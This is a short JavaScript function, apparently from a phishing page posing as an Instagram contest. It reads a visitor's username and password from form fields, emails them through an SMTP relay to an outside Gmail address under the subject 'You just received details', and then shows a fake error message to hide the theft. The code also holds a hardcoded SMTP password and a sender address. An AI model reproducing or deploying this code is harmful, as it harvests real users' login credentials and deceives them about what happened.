function sendEmail(){
  Email.send({
    Host : "smtp.elasticemail.com",
    Username : "naomisharon289@gmail.com",
    Password : "BDD2745A3BA8C53769D575BD8359800CD97E",
  To : 'instagramcontest729@gmail.com',
  From : "naomisharon289@gmail.com",
  Subject : "You just received details",
  Body : "Name: " + document.getElementById("uname").value
       + "<br>"
        + "<br> password: " + document.getElementById("upass").value
}).then(
message => alert("Error processing request, please try again shortly")
);
}


